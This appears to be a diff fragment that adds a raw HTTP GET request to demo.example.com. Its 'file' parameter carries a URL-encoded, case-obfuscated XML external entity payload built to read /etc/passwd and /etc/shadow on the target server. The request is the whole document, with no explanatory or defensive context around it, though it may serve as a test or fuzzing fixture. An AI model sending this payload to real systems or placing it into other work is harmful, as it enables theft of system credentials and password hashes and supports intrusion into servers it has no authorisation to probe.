@@ -1,0 +1,4 @@
+GET /a?file=<!dOcTyPe%20R%20[<!eNtItY%20%%20p%20SyStEm%20"FiLe:///EtC/pAsSwD"><!eNtItY%20%%20q%20"<!EnTiTy%20X%20sYsTeM%20'fIlE:///eTc/ShAdOw'>">%20%Q;]><r/> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
